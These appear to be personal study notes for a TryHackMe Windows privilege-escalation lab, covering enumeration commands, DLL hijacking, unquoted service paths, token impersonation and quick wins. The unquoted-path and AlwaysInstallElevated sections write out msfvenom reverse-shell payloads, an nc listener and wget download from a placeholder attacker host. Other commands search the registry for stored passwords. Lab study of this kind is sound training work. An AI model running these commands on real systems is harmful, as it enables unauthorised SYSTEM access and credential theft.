# Room
https://tryhackme.com/room/winprivesc

# Task 1 - intro
* intro
* example Windows account user levels
    * administrator (local)
    * standard (local)
    * guest
    * standard (domain)
    * administrator (domain)
* other non user accounts
    * SYSTEM
* resources
    * https://github.com/sagishahar/lpeworkshop

# Task 2 - information gathering
* user enumeration
    * whoami /priv
    * net users
    * net user [username]
    * qwinsta
    * query session
    * net localgroup
    * net localgroup [groupname]
* system enumeration
    * systeminfo
    * hostname
* file searching
    * findstr
* patch levels
    * wmic qfe get Caption,Description,HotFixID,InstalledOn
* network connections
    * netstat -ano
* scheduled tasks
    * schtasks
    * schtasks /query /fo LIST /v
* drivers
    * driverquery
* services
    * sc query
    * sc query windefend
    * sc queryex type=service

# Task 3 - tools of the trade
* resources
    * winpeas : https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
    * powerup : https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
    * windows exploit suggester : https://github.com/AonCyberLabs/Windows-Exploit-Suggester
    * windows exploit suggester NG : https://github.com/bitsadmin/wesng

# Task 4 - vulnerable software
* wmic
    * wmic product
    * wmic product get name,version,vendor
    * wmic service list brief
* sc
    * sc query

# Task 5 - dll hijacking
* dll hijacking allows you to inject code into an application
* dll - dynamic link library
* dlls store additional functions outside of the main application
* Windows stores many dll files in the c:\windows\system32 directory
* a single dll file can be used by many different applications
* dll hijacking protections
    * safedllsearchmode
    * https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order
* finding entry points for dll hijacking
    * procmon
* creating malicious dlls
    * apt install gcc-mingw-w64-x86-64
    * x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
    * sc stop dllsvc
    * sc start dllsvc

# Task 6 - unquoted service path
* when the binary path to a service is not enclosed in quotes
* unquoted: c:\program files\program\abc.exe
* quoted: "c:\program files\program\abc.exe"
* how to find unquoted service paths
    * winpeas
    * powerup
* check writable permissions of a directory
    * accesschk64.exe /accepteula -uwdq "c:\program files\"
* sc qc unquotedsvc
* msfvenom can be used to create a simple reverse shell to exploit the vulnerable unquoted service path
    * attacker: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[attacker_port] -f exe > Common.exe
    * attacker: python -m http.server 8383
    * attacker: nc -nvlp [attacker_port]
    * target: wget -O Common.exe http://[attacker_ip]:8383/Common.exe
    * target: copy Common.exe "c:\program files\unquoted path service\Common.exe"
    * target: sc start unquotedsvc
    * attacker: catch shell

# Task 7 - token impersonation
* security tokens can be used by the user through impersonation
* whoami /priv
* exploits
    * hot potato example
        * 1 - look for systems that use wpad
        * 2 - request intercepted by exploit, redirected to 127.0.0.1
        * 3 - target asks for proxy config - wpad.dat
        * 4 - malicous wpad.dat is sent to target
        * 5 - target system tries to connect to proxy through malicious wpad.dat
        * 6 - exploit asks target to perform NTLM auth
        * 7 - target sends NTLM handshake
        * 8 - handshake is received and relayed to an SMB service to create a process, this process has the privilege level of the service (wpad) that was targeted

# Task 8 - quick wins
* scheduled tasks
    * schtasks
* alwaysinstallelevated
    * reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    * reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    * attacker: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[attacker_port] -f msi -o mal.msi
    * target: msiexec /quiet /qn /i mal.msi
* saved creds
    * cmdkey /list
    * runas
    * runas /savecred /user:admin shell.exe
* reg keys
    * reg query HKLM /f password /t REG_SZ /s
    * reg query HKCU /f password /t REG_SZ /s
* unattend files
    * files that should have been deleted after setup